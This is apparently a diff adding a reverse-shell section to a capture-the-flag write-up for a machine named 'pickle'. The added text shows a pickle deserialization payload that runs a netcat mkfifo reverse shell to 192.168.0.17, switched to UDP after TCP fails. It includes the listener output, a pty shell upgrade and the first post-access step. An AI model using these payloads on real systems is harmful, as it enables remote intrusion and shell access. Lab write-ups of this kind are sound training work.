@@ -279,3 +279,29 @@ When we run the script, the server returns ICMP queries to us, so the command wa
     14:03:56.577245 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 4, length 64
     14:03:57.578394 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 5, length 64
     14:03:57.578461 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 5, length 64
+
+# Reverse Shell
+
+Let's change the script to do a reverse shell. I will be using a pentestmonkey command to do my reverse shell.
+
+    return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.17 9001 >/tmp/f',))
+
+I tried the above command, and also tried other command like wget, but it didn't work, it doesn't accept TCP connections just 21 and 1337. I had to change the communication mode by doing a UDP reverse shell. I only added the -u option to specify that it is UDP mode.
+
+    return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 192.168.0.17 9001 >/tmp/f',))
+    
+ Now we have to use the netcat command to listen to a port and especially not to forget the -u option to specify the UDP protocol. And if now, I run the script, the server returns a shell to me.
+ 
+ 
+    # nc -u -lvnp 9001
+    nc: listening on :: 9001 ...
+    nc: listening on 0.0.0.0 9001 ...
+    nc: connect to 0.0.0.0 9001 from 192.168.0.44 53808
+    /bin/sh: 0: can't access tty; job control turned off
+    $ python -c "import pty;pty.spawn('/bin/bash')"
+    lucas@pickle:~$ whoami
+    lucas
+
+I have used a lot of enumeration script, but it gives me nothing at all. I checked the file /opt/project/project.py and there is a new interesting function.
+
+
